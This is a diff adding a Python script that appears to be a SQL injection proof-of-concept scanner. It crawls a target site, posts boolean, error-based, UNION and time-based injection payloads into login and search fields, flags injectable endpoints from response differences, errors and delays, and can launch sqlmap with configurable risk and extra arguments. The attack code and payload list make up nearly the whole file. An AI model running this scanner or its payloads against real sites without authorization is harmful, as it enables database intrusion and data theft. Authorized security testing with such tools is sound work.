@@ -1,0 +1,479 @@
+#!/usr/bin/env python3
+
+
+import argparse
+import json
+import os
+import sys
+import time
+import hashlib
+import html
+import urllib.parse
+import subprocess
+from typing import List
+import requests
+from bs4 import BeautifulSoup
+import difflib
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# ---- Config ----
+DEFAULT_HEADERS = {"User-Agent": "poc-runner/1.0"}
+TIMEOUT = 15
+DELAY = 0.25
+
+
+SQLI_PAYLOADS = {
+    "boolean_true": "admin' OR '1'='1' -- ",
+    "boolean_false": "admin' AND '1'='0' -- ",
+    "error_based": "' AND (SELECT 1/0) -- ",
+    "union_version": "admin' UNION SELECT 1,@@version,3 -- ",
+    "time_based": "admin' OR IF(1=1,SLEEP(5),0) -- "
+}
+
+POST_TEMPLATES = [
+    {"uname": "PAYLOAD", "pass": "test"},
+    {"username": "PAYLOAD", "password": "test"},
+    {"searchFor": "PAYLOAD"},
+    {"message": "PAYLOAD"}
+]
+
+SQLMAP_BIN = os.environ.get("SQLMAP_BIN", "sqlmap")  
+
+
+BOOLEAN_DIFF_RATIO_THRESHOLD = 0.07  
+BOOLEAN_SIZE_DIFF_THRESHOLD = 40     
+TIME_BASED_THRESHOLD = 4.5          
+MAX_BODY_READ_BYTES = 200 * 1024     
+
+
+def eprint(*args, **kwargs):
+    print(*args, file=sys.stderr, **kwargs)
+
+def safe_mkdir(p):
+    os.makedirs(p, exist_ok=True)
+
+def sha8(s: str):
+    return hashlib.sha1(s.encode()).hexdigest()[:8]
+
+def safe_filename_for(url: str, prefix: str):
+    p = urllib.parse.urlparse(url)
+    path = p.path or "/"
+    stamp = str(int(time.time()))
+    name_hash = sha8(p.netloc + path)
+    safe_netloc = p.netloc.replace(":", "_")
+    safe_path_part = sha8(path)
+    return f"{prefix}_{safe_netloc}_{safe_path_part}_{stamp}.html"
+
+def save_bytes(outdir: str, url: str, content: bytes) -> str:
+    """
+    Save content to a safer filename based on URL path hash + timestamp.
+    url parameter used for filename generation.
+    """
+    safe_mkdir(outdir)
+    name = safe_filename_for(url, "resp")
+    path = os.path.join(outdir, name)
+    MAX_SAVE_BYTES = 2 * 1024 * 1024  # 2MB cap per saved response
+    try:
+        data = content if isinstance(content, (bytes, bytearray)) else str(content).encode("utf-8", errors="ignore")
+        if len(data) > MAX_SAVE_BYTES:
+            data = data[:MAX_SAVE_BYTES]
+        with open(path, "wb") as fh:
+            fh.write(data)
+        return path
+    except Exception:
+        fallback = os.path.join(outdir, f"resp_{sha8(str(content)[:100])}.html")
+        with open(fallback, "wb") as fh:
+            fh.write((content if isinstance(content, bytes) else str(content)).encode("utf-8", errors="ignore")[:MAX_SAVE_BYTES])
+        return fallback
+
+def find_error_signatures(text: str) -> List[str]:
+    if not text:
+        return []
+    sigs = [
+        "SQL syntax", "mysql_fetch", "Warning: mysql",
+        "You have an error in your SQL syntax",
+        "MySQL", "SQLSTATE", "syntax error", "odbc", "ORA-"
+    ]
+    return [s for s in sigs if s.lower() in text.lower()]
+
+def contains_reflection(text: str, payload: str) -> str:
+    # kept for potential future use (not used for XSS here)
+    if not text:
+        return ""
+    if payload in text:
+        return "raw"
+    if html.escape(payload) in text:
+        return "html_escaped"
+    if urllib.parse.quote_plus(payload) in text:
+        return "urlencoded"
+    if urllib.parse.quote(payload, safe='') in text:
+        return "urlencoded_raw"
+    return ""
+
+def get_links(base_url: str, html_text: str) -> List[str]:
+    try:
+        soup = BeautifulSoup(html_text or "", "html.parser")
+    except Exception:
+        return []
+    links = set()
+    for a in soup.find_all('a', href=True):
+        href = a['href'].strip()
+        if href.startswith('http://') or href.startswith('https://'):
+            links.add(href)
+        else:
+            links.add(urllib.parse.urljoin(base_url, href))
+    return sorted(links)
+
+
+def make_session_with_retries():
+    session = requests.Session()
+    retry = Retry(total=2, backoff_factor=0.5, status_forcelist=(500, 502, 503, 504))
+    adapter = HTTPAdapter(max_retries=retry)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    session.headers.update(DEFAULT_HEADERS)
+    return session
+
+def fetch(url: str, session: requests.Session, params: dict=None, data: dict=None, headers: dict=None):
+    try:
+        if headers:
+            req_headers = session.headers.copy()
+            req_headers.update(headers)
+        else:
+            req_headers = session.headers
+        if data is not None:
+            r = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True, headers=req_headers)
+        else:
+            r = session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True, headers=req_headers)
+        time.sleep(DELAY)
+        return r
+    except Exception as e:
+        eprint(f"[!] Request error for {url}: {e}")
+        return None
+
+
+def run_sqlmap_on_poc(target_url: str, method: str="GET", data: str=None, headers: dict=None,
+                      outdir: str=".", level: int=1, risk: int=1, timeout_s: int=180,
+                      extra_args: List[str]=None):
+    safe_mkdir(outdir)
+    sql_outdir = os.path.join(outdir, "sqlmap")
+    safe_mkdir(sql_outdir)
+
+    cmd = [SQLMAP_BIN, "-u", target_url, "--batch", f"--risk={risk}", f"--level={level}", "--random-agent"]
+    if method.upper() == "POST" and data:
+        cmd += ["--data", data]
+    if headers:
+        hdrs = "\\r\\n".join(f"{k}: {v}" for k, v in headers.items())
+        cmd += ["--headers", hdrs]
+    if extra_args:
+        cmd += extra_args
+
+    stdout_f = os.path.join(sql_outdir, "sqlmap_stdout.txt")
+    stderr_f = os.path.join(sql_outdir, "sqlmap_stderr.txt")
+
+    eprint(f"[*] Running sqlmap: {' '.join(cmd)}")
+    try:
+        with open(stdout_f, "w", encoding="utf-8") as outp, open(stderr_f, "w", encoding="utf-8") as errp:
+            proc = subprocess.run(cmd, stdout=outp, stderr=errp, text=True, timeout=timeout_s)
+        ret = proc.returncode
+    except subprocess.TimeoutExpired:
+        return {"status": "timeout", "stdout_file": stdout_f, "stderr_file": stderr_f}
+    except FileNotFoundError:
+        return {"status": "error", "error": "sqlmap not found", "cmd": cmd}
+    except Exception as e:
+        return {"status": "error", "error": str(e), "cmd": cmd}
+
+    vulnerable_hint = False
+    try:
+        with open(stderr_f, "r", encoding="utf-8", errors="ignore") as fh:
+            st = fh.read(8192).lower()
+            if "is vulnerable" in st or "payload" in st or "parameter" in st:
+                vulnerable_hint = True
+    except Exception:
+        pass
+
+    return {
+        "status": "done",
+        "returncode": ret,
+        "stdout_file": stdout_f,
+        "stderr_file": stderr_f,
+        "sqlmap_output_dir": sql_outdir,
+        "vulnerable_hint": vulnerable_hint,
+        "cmd": cmd
+    }
+
+
+def collect_endpoints(base_url: str, session: requests.Session, max_links: int=200, allowed_netloc: str=None):
+    endpoints = [base_url]
+    r = fetch(base_url, session)
+    if r and r.text:
+        links = get_links(base_url, r.text)
+        for l in links:
+            if allowed_netloc:
+                try:
+                    if urllib.parse.urlparse(l).netloc != allowed_netloc:
+                        continue
+                except Exception:
+                    continue
+            if l not in endpoints:
+                endpoints.append(l)
+            if len(endpoints) >= max_links:
+                break
+    return endpoints
+
+def test_post_template(session: requests.Session, url: str, template: dict, payload: str, outdir: str, options: dict):
+    data = {}
+    for k, v in template.items():
+        if isinstance(v, str) and "PAYLOAD" in v:
+            data[k] = v.replace("PAYLOAD", payload)
+        elif v == "PAYLOAD":
+            data[k] = payload
+        else:
+            data[k] = v
+    t0 = time.time()
+    r = fetch(url, session, data=data)
+    elapsed = None
+    try:
+        elapsed = round(time.time() - t0, 3) if r is not None else None
+    except Exception:
+        elapsed = None
+
+    saved = ""
+    errs = []
+    try:
+        if r is not None:
+            saved = save_bytes(outdir, url, r.content)
+            errs = find_error_signatures(r.text or "")
+    except Exception:
+        pass
+
+    result = {
+        "url": url,
+        "params": list(data.keys()),
+        "method": "POST",
+        "payload": None,
+        "payload_hash": sha8(payload),
+        "status": getattr(r, "status_code", None),
+        "size": len(r.content) if r is not None and r.content is not None else 0,
+        "time_s": elapsed,
+        "error_signatures": errs,
+        "saved_file": saved
+    }
+
+    findings = []
+    non_destructive = options.get("non_destructive", True)
+
+    if not non_destructive and isinstance(elapsed, (int, float)) and elapsed >= TIME_BASED_THRESHOLD:
+        findings.append({"type": "sqli_time", "detail": result})
+
+    if result.get("error_signatures"):
+        if non_destructive:
+            findings.append({"type": "sqli_error_suspected", "detail": result})
+        else:
+            findings.append({"type": "sqli_error", "detail": result})
+
+    return result, findings
+
+def compare_response_bodies(a: bytes, b: bytes) -> float:
+    """Return a ratio 0..1 of difference (1.0 means very different)."""
+    try:
+        ta = (a or b"").decode("utf-8", errors="ignore")
+        tb = (b or b"").decode("utf-8", errors="ignore")
+        sm = difflib.SequenceMatcher(None, ta, tb)
+        return 1.0 - sm.ratio()
+    except Exception:
+        return 0.0
+
+def run_scan(task: dict, outdir: str):
+    safe_mkdir(outdir)
+    session = make_session_with_retries()
+
+    base = task.get("target", {}).get("url") or task.get("base_url")
+    if not base:
+        raise ValueError("no base url in task payload")
+
+    allowed_netloc = urllib.parse.urlparse(base).netloc
+    max_links = int(task.get("options", {}).get("max_links", 200))
+    non_destructive = bool(task.get("options", {}).get("non_destructive", True))
+
+    endpoints = task.get("endpoints") or collect_endpoints(
+        base, session, max_links=max_links, allowed_netloc=allowed_netloc
+    )
+    endpoints = list(dict.fromkeys(endpoints))
+
+    findings = []
+    all_results = []
+
+    for ep in endpoints:
+        # POST templates for SQLi heuristics
+        for template in POST_TEMPLATES:
+            if any("PAYLOAD" in str(v) for v in template.values()):
+                # boolean test: call both true and false and compare
+                r_true, findings_true = test_post_template(
+                    session, ep, template, SQLI_PAYLOADS["boolean_true"], outdir, task.get("options", {})
+                )
+                r_false, findings_false = test_post_template(
+                    session, ep, template, SQLI_PAYLOADS["boolean_false"], outdir, task.get("options", {})
+                )
+                all_results.extend([r_true, r_false])
+
+                try:
+                    body_true = b""
+                    body_false = b""
+                    if r_true.get("saved_file"):
+                        with open(r_true["saved_file"], "rb") as fh:
+                            body_true = fh.read(MAX_BODY_READ_BYTES)
+                    if r_false.get("saved_file"):
+                        with open(r_false["saved_file"], "rb") as fh:
+                            body_false = fh.read(MAX_BODY_READ_BYTES)
+                    diff_ratio = compare_response_bodies(body_true, body_false)
+                except Exception:
+                    diff_ratio = 0.0
+
+                size_diff = abs((r_true.get("size") or 0) - (r_false.get("size") or 0))
+                if diff_ratio >= BOOLEAN_DIFF_RATIO_THRESHOLD or size_diff >= BOOLEAN_SIZE_DIFF_THRESHOLD:
+                    confidence = 0.9 if diff_ratio >= BOOLEAN_DIFF_RATIO_THRESHOLD else 0.6
+                    findings.append({
+                        "type": "sqli_boolean",
+                        "detail": {
+                            "true": r_true,
+                            "false": r_false,
+                            "diff_ratio": diff_ratio,
+                            "size_diff": size_diff,
+                            "confidence": confidence
+                        }
+                    })
+
+            
+            r_err, err_findings = test_post_template(
+                session, ep, template, SQLI_PAYLOADS["error_based"], outdir, task.get("options", {})
+            )
+            all_results.append(r_err)
+            for f in err_findings:
+                findings.append(f)
+
+            
+            r_union, _ = test_post_template(
+                session, ep, template, SQLI_PAYLOADS["union_version"], outdir, task.get("options", {})
+            )
+            all_results.append(r_union)
+            try:
+                if r_union.get("saved_file"):
+                    with open(r_union["saved_file"], "rb") as fh:
+                        txt = fh.read(MAX_BODY_READ_BYTES).decode("utf-8", errors="ignore").lower()
+                    if "mysql" in txt or "@@version" in txt:
+                        if non_destructive:
+                            findings.append({"type": "sqli_union_suspected", "detail": r_union})
+                        else:
+                            findings.append({"type": "sqli_union", "detail": r_union})
+            except Exception:
+                pass
+
+           
+            r_time, _ = test_post_template(
+                session, ep, template, SQLI_PAYLOADS["time_based"], outdir, task.get("options", {})
+            )
+            all_results.append(r_time)
+            try:
+                if r_time.get("time_s") is not None:
+                    if r_time.get("time_s") >= TIME_BASED_THRESHOLD:
+                        if non_destructive:
+                            findings.append({"type": "sqli_time_suspected", "detail": r_time})
+                        else:
+                            findings.append({"type": "sqli_time", "detail": r_time})
+            except Exception:
+                pass
+
+    
+    options = task.get("options", {})
+    if options.get("use_sqlmap") and not options.get("non_destructive", True):
+        poc = task.get("finding", {}).get("poc", {})
+        poc_method = poc.get("method", "GET")
+        poc_path = poc.get("path", "")
+        target_url = urllib.parse.urljoin(base, poc_path)
+        poc_body = None
+        poc_headers = poc.get("headers")
+        if poc_method.upper() == "POST" and isinstance(poc.get("body"), dict):
+            poc_body = urllib.parse.urlencode(poc.get("body"))
+        level = int(options.get("sqlmap_level", 1))
+        risk = int(options.get("sqlmap_risk", 1))
+        timeout_s = int(options.get("sqlmap_timeout", options.get("timeout", 180)))
+        extra_args = options.get("sqlmap_extra_args") if isinstance(options.get("sqlmap_extra_args"), list) else None
+
+        sqlmap_summary = run_sqlmap_on_poc(
+            target_url, method=poc_method, data=poc_body,
+            headers=poc_headers, outdir=outdir,
+            level=level, risk=risk, timeout_s=timeout_s,
+            extra_args=extra_args
+        )
+        all_results.append({"sqlmap": sqlmap_summary})
+        if sqlmap_summary.get("vulnerable_hint"):
+            findings.append({"type": "sqlmap_detected", "detail": sqlmap_summary})
+
+    summary = {
+        "task_id": task.get("task_id"),
+        "base_url": base,
+        "collected_endpoints": endpoints,
+        "scan_time": time.time(),
+        "results_count": len(all_results),
+        "findings_count": len(findings),
+        "findings": findings,
+        "results": all_results
+    }
+
+    summary_path = os.path.join(outdir, "summary.json")
+    with open(summary_path, "w", encoding="utf-8") as sf:
+        json.dump(summary, sf, indent=2, ensure_ascii=False)
+
+    return summary_path, summary
+
+
+def main():
+    parser = argparse.ArgumentParser(description="poc_runner_scanner (no-xss variant)")
+    parser.add_argument("--payload", required=True, help="path to payload JSON (task)")
+    parser.add_argument("--outdir", required=True, help="output directory to save HTML and summary")
+    args = parser.parse_args()
+
+    payload_path = args.payload
+    outdir = args.outdir
+    safe_mkdir(outdir)
+
+    if not os.path.exists(payload_path):
+        eprint("[!] payload file not found:", payload_path)
+        sys.exit(2)
+
+    try:
+        with open(payload_path, "r", encoding="utf-8") as pf:
+            task = json.load(pf)
+    except Exception as e:
+        eprint("[!] failed to read payload JSON:", e)
+        sys.exit(3)
+
+    if not (task.get("target", {}).get("url") or task.get("base_url")):
+        eprint("[!] payload JSON missing 'target.url' or 'base_url'")
+        sys.exit(3)
+
+    eprint("[*] Starting scan for task_id:", task.get("task_id"))
+    try:
+        summary_path, summary = run_scan(task, outdir)
+        eprint("[*] Scan finished, summary saved to", summary_path)
+
+        
+        has_sqli = any(
+            isinstance(f, dict) and str(f.get("type", "")).startswith("sqli_")
+            for f in summary.get("findings", [])
+        )
+
+        
+        print("true" if has_sqli else "false")
+        # بعد كده نطبع الـ JSON كله
+        print(json.dumps({"status": "ok", "summary": summary}, ensure_ascii=False))
+
+        sys.exit(0)
+    except Exception as e:
+        eprint("[!] fatal error during scan:", str(e))
+        sys.exit(4)
+
+if __name__ == "__main__":
+    main()
